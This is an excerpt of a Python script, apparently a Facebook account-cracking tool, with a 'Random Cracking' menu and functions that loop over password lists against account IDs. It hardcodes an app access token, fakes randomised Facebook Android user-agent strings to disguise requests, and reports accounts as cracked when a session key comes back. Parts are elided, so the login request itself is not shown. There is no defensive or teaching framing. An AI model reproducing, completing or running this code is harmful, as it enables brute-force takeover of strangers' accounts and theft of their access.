...
#-----------------------[ MAIN-CODE ]-----------------------#
def Main():
    fresh();print(f'\x1b[38;5;196m[\x1b[1;97m1\x1b[38;5;196m]\x1b[38;5;46m Random Cracking\n\x1b[38;5;196m[\x1b[1;97m0\x1b[38;5;196m]\x1b[38;5;46m Exit Manu ');line()
...
def api3(ids,names,passlist):
    try:
        ...
        for pw in passlist:
            ...
            fbbv = str(random.randint(000000000,999999999))
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/71.0.0.72;FBBV/737359590;FBDM/{density=2.25,width=754,height=1691};FBLC/th_TH;FBCR/Vodafone;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Hot 40i;FBSV/13.0;nullFBCA/armeabi-v7a:armeabi;]'
            head = {'User-Agent':uaddx,
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
...
def rndmx(ids,pasx,tl):
        ...
        try:
                for pas in pasx:
                        ...
                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/399.0.0.90.20;FBBV/852010531;FBRV/0;FBPN/com.facebook.katana;FBLC/pl_PL;FBMF/Moto G24 Power;FBBD/Moto G24 Power;FBDV/Motorola;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
                        ...
                        if 'session_key' in po:
                                ...
                                if 'y' in cpx:print(f'\r{r} [TCS-CP] {str(uid)} | {pas} ')
